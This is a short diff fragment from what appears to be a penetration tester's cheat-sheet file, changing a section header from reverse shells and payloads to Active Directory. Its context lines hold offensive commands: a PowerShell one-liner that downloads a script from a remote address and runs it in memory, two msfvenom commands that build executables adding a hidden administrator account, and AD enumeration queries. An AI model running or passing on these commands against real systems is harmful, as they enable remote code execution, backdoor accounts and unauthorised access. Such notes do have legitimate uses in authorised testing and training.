@@ -62,7 +62,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 msfvenom -a x86 --platform Windows -p windows/exec CMD='cmd /C "net user toto toto1234 /add & net localgroup administrators toto /add"' -f exe > /home/kali/share/addadminuser.exe
 msfvenom -a x64 --platform Windows -p windows/x64/exec CMD='cmd /C "net user toto toto1234 /add & net localgroup administrators toto /add"' -f exe > /home/kali/share/addadminuser.exe
 
-================================================================================ REVERSE SHELLS/PAYLOADS
+================================================================================ Active Directory
 ===Enum Domain Computers (powerview)
 Get-ADComputer -Filter * -Properties *
 Get-ADGroup -Filter * 
